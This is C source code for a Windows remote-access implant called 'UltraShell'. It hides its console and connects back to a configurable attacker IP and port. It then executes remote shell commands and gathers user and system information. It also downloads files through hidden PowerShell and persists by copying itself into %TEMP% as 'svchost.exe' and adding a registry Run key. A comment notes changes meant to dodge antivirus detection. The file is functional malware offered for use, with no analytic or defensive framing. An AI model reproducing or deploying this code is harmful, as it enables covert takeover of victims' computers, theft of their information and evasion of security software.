#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <strings.h>
#include <unistd.h>
#include <errno.h>
#pragma comment(lib, "Ws2_32.lib")
//COMPILE with gcc mainbeta.c -lWs2_32 -o *.exe|| lWs2_32 is the windows socket lib


//THIS IS NOT WRITTEN WELL!!!
//THIS IS NOT WRITTEN WELL!!!


// Some random changes of variable uc to change file signature temporarily(AV detected)
//CONNECTION VARIABLES (USE "ncat -k -lv 64230" on server)
char ipaddr[16] = "xxx.xxx.xxx.xxx";
int port = 64230;
int uc = 0;

//PREFACE FUNCTIONS
int RevShell(SOCKET s);
int AddPersistence(SOCKET s);
int DelPersistence(SOCKET s);
int HelpMenuSocket(SOCKET s);
int ShellCommands(SOCKET s);
int UnsafeShell(SOCKET s);
int DownloadFromURI(SOCKET s);
int sysinfo(SOCKET s);

int ScreenShot(SOCKET s,char uploadurl[]);
int UploadFile(SOCKET s,char uploadurl[]);

//WATCHDOG VARIABLES 
//IMPORTANT VARIABLES ( SOCKET ETC )
SOCKET s;
int status;
int socket_status;
int is_socket_dead = 0;
int SWatchdogStart= 0;
//FUNCTION VARABLES
char message_reply[2048];
int persistenceadded = 0;
char breakoutofshell[32] = "break-shell";
char message[] = " \b";
int recv_size = 2048;
char buf[256];
char uploadurl[2048] = " ";
char downloadurl[2048] = " ";

int main(){
    FreeConsole();
    //CONNECT SOCKET
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2),&wsa);
    s = socket(AF_INET,SOCK_STREAM,0);
    struct sockaddr_in connect_info;
    connect_info.sin_family = AF_INET;
    connect_info.sin_port = htons( port );
    connect_info.sin_addr.s_addr = inet_addr(ipaddr);
    status = connect(s,(struct sockaddr*)&connect_info,sizeof(connect_info));
    int reccount = 0;
    while(status == -1){
        Sleep(10000);
        status = connect(s,(struct sockaddr*)&connect_info,sizeof(connect_info));
        if(status == -1){
            closesocket(s);
        }
    }
    while(1){ // Main execution bit of shell !DO NOT DELETE!
        if(is_socket_dead == 1){
            Sleep(1000);
            closesocket(s);
            s = socket(AF_INET,SOCK_STREAM,0);
            status = connect(s,(struct sockaddr*)&connect_info,sizeof(connect_info));
        }
        RevShell(s);
        Sleep(1000);
    }
    return 0;
}
int RevShell(SOCKET s)
{
    //FIRST DISPLAY MSG
    send(s,"To Display Help Type \"help\"\n",29,0);
    //while loop to listen&compare&call appropriate functions
    while(send(s,message,sizeof(message),0) != -1)
    {
        char fancythings[32] = "UltraShell# ";
        send(s, fancythings, sizeof(fancythings), 0);
        socket_status = recv(s,message_reply, recv_size, 0);
        if(socket_status == 0){
                is_socket_dead = 1;
                return 0;
            }
        message_reply[recv_size] = '\0';
        //Variables for Compareing
        char RegPers[32] = "add-persistence";
        char DelPers[32] = "del-persistence";
        char HelpMenu[32] = "help";
        char DownloadFileC[32] = "downloadfile";
        char shellstr[32] = "shell";
        char adminpersistence[32] = "admin-pers";
       //COMPARE & CALL FUNCTION
        if(strstr(message_reply,RegPers) != NULL)
        {
            AddPersistence(s);
        }
        else if(strstr(message_reply,DelPers) != NULL)
        {
            DelPersistence(s);
        }
        else if(strstr(message_reply,shellstr) != NULL)
        {
            ShellCommands(s);
        }
        else if(strstr(message_reply,HelpMenu) != NULL)
        {
            HelpMenuSocket(s);
        }
        else if(strcmp(message_reply,"\n") == 0 || strcmp(message_reply," \n") == 0){
        }
        else if(strstr(message_reply,DownloadFileC) != NULL){
            DownloadFromURI(s);
        }
        else if(strstr(message_reply,"sysinfo") != NULL){
            sysinfo(s);
        }

        else
        {
            send(s,"This string does not match any option. To see options use \"help\".\n",67,0); 
        }
        memset(message_reply,'\0',2048);
    }
    closesocket(s);
    return 0;
}
int AddPersistence(SOCKET s)
{
    memset(message_reply,'\0',2048);
    if (persistenceadded == 0)
    {
        char cwd[1024];
        if (getcwd(cwd, sizeof(cwd)) != NULL){
            fprintf(stdout, "Current working dir: %s\n", cwd);
        }
        char cwd2[1024];
        char filepath[200] = "\\svchost.exe";
        char filepath2[256];
        sprintf(filepath2, "%s%s",cwd, filepath);
        char cmmnd2[1024];
        char percent[8] = "%";
        sprintf(cmmnd2,"mkdir %sTEMP%s\\3UF4-84HG-AJ65-69FS && copy %s %sTEMP%s\\3UF4-84HG-AJ65-69FS\\svchost.exe",percent,percent,filepath2,percent,percent);
        system(cmmnd2);
        memset(cmmnd2,0,sizeof(cmmnd2));
        char cmmnd3[1024] = "echo yes | reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Win32Explorer /d %TEMP%\\3UF4-84HG-AJ65-69FS\\svchost.exe";
        int regpersworked = system(cmmnd3);
        send(s, "Programm Exited with code :", 28, 0);
        char regpersworked2[2];
        sprintf(regpersworked2,"%i",regpersworked);
        send(s, regpersworked2, 2, 0);
        send(s,"\n",2,0);
        if(regpersworked == 0)
        {
            persistenceadded = 1;
        }
    }
    else
        {
        send(s, "persistence flag already set\n", 30, 0);
        }
    return 0;
}
int HelpMenuSocket(SOCKET s)
{
    send(s, "to add persistence ==> \"add-persistence\"\n", 44, 0);
    send(s, "to delete persistence ==> \"del-persistence\"\n", 47, 0);
    send(s, "to display help menu ==> \"help\"\n", 33, 0);
    send(s, "to use shell ==> \"shell\"\n", 26, 0);
    send(s,"To download File ==> \"download-file\"\n",40,0);
    send(s,"to display system information ==> \"sysinfo\"\n",47,0);
    return 0;
}
DWORD WINAPI ExecShellCommands(void* data) {
    FILE *cmmnd = popen(message_reply,"r");
     memset(buf,'\0',256);
    while(fgets(buf,sizeof(buf), cmmnd) != 0){
        send(s, buf, sizeof(buf), 0);
        memset(buf,'\0',256);
        memset(message_reply,'\0',2048);
    }
}
int ShellCommands(SOCKET s)
{
            send(s,"To Return to Main Menu: \"break-shell\"\n",39,0);
            memset(message_reply,'\0',2048);
            recv_size = 2048;
            send(s,"Default = 5000\nNumber 1 = 50\nNumber 2 = 1000\nNumber 3 = 10000\nNumber 4 = 100000\n",84,0);
            send(s,"Please enter the thread timeout value(Choose 1-4):",51,0);
            recv(s,message_reply, recv_size, 0);
            int ThreadExecTimeoutVar1;
            message_reply[recv_size] = '\0';
            if(strcmp(message_reply,"1\n") == 0){
                ThreadExecTimeoutVar1 = 50;
            }
            else if(strcmp(message_reply,"2\n") == 0){
                ThreadExecTimeoutVar1 = 100;
            }
            else if(strcmp(message_reply,"3\n") == 0){
                ThreadExecTimeoutVar1 = 10000;
            }
            else if(strcmp(message_reply,"4\n") == 0){
                ThreadExecTimeoutVar1 = 100000;
            }
            else{
                ThreadExecTimeoutVar1 = 5000;
            }
            memset(message_reply,'\0',2048);
            while(1){
                send(s,"UltraShell_CMD_SAFEMODE# ",25,0);
                recv(s,message_reply, recv_size, 0);
                message_reply[recv_size] = '\0';
                char svchostnokill[32] = "svchost";
                if(strstr(message_reply,breakoutofshell) != NULL){
                    break;
                }
                else if(strstr(message_reply,svchostnokill) != NULL){
                    send(s,"You cant kill the hosting process\n",37,0);
                }
                 else if(strcmp(message_reply,"\n") == 0 || strcmp(message_reply," \n") == 0){
                }
                else{
                        HANDLE ExShCm_H= CreateThread(NULL, 0, ExecShellCommands, NULL, 0, NULL);
                        WaitForSingleObject(ExShCm_H,ThreadExecTimeoutVar1);
                        TerminateThread(ExShCm_H,0);

                    }

        memset(message_reply,'\0',2048);
       }
}
int DelPersistence(SOCKET s)
{
    char cmmnddelpers[1024] = "echo yes | reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Win32Explorer /F";
    int regperdel = system(cmmnddelpers);
    send(s, "Programm Exited with code :", 28, 0);
    char regperdelworked[3];
    sprintf(regperdelworked,"%i%s",regperdel,"\n");
    send(s, regperdelworked, 3, 0);
    memset(message_reply,'\0',2048);
}
int DownloadFromURI(SOCKET s){
    char dwnldcmmnd[2048];
    char dwnldpath[2048];
    char dwnlduri[2048];
    int dwnldworked = 1;
    memset(dwnldpath,0,sizeof(dwnldpath));
    memset(dwnlduri,0,sizeof(dwnlduri));
    memset(message_reply,'\0',2048);
    send(s,"Enter URI to download --> ",26,0);
    recv(s,message_reply, recv_size, 0);
    message_reply[recv_size] = '\0';
    sprintf(dwnlduri,"%s\b",message_reply);
    strtok(dwnlduri, "\n");
    memset(message_reply,'\0',2048);
    send(s,"Please enter the path to save the file to starting with C:\\ --> ",64,0);
    recv(s,message_reply, recv_size, 0);
    message_reply[recv_size] = '\0';
    sprintf(dwnldpath,"%s\b",message_reply);
    strtok(dwnldpath, "\n");
    sprintf(dwnldcmmnd,"cmd.exe /c powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri \"%s\" -OutFile \"%s\" ",dwnlduri,dwnldpath);
    dwnldworked = system(dwnldcmmnd);
    char dwnldreturn[64];
    sprintf(dwnldreturn,"Download exited with code: %i\n",dwnldworked);
    send(s,dwnldreturn,sizeof(dwnldreturn),0);
    memset(dwnldpath,0,sizeof(dwnldpath));
    memset(dwnlduri,0,sizeof(dwnlduri));
    memset(message_reply,'\0',2048);
    return 0;
}
int sysinfo(SOCKET s){
    char username[32];
    char profilepath[250];
    char systime[128];
    char sysdate[128];
    char sysos[64];
    ExpandEnvironmentStrings("%USERPROFILE%",profilepath,250);
    ExpandEnvironmentStrings("%USERNAME%",username,32);
    ExpandEnvironmentStrings("%TIME%",systime,128);
    ExpandEnvironmentStrings("%OS%",sysos,64);
    ExpandEnvironmentStrings("DATE",sysdate,128);
    send(s,"//SYSINFO//\n",13,0);
    send(s,"Username: ",10,0);
    send(s,username,sizeof(username),0);
    send(s,"\n",2,0);
    send(s,"Userprofile: ",13,0);
    send(s,profilepath,sizeof(profilepath),0);
    send(s,"\n",2,0);
    send(s,"System Time: ",13,0);
    send(s,systime,sizeof(systime),0);
    send(s,"\n",2,0);
    send(s,"System Date: ",13,0);
    send(s,sysdate,sizeof(sysdate),0);
    send(s,"\n",2,0);
    send(s,"Operating System: ",18,0);
    send(s,sysos,sizeof(sysos),0);
    send(s,"\n",2,0);
    return 0;
}
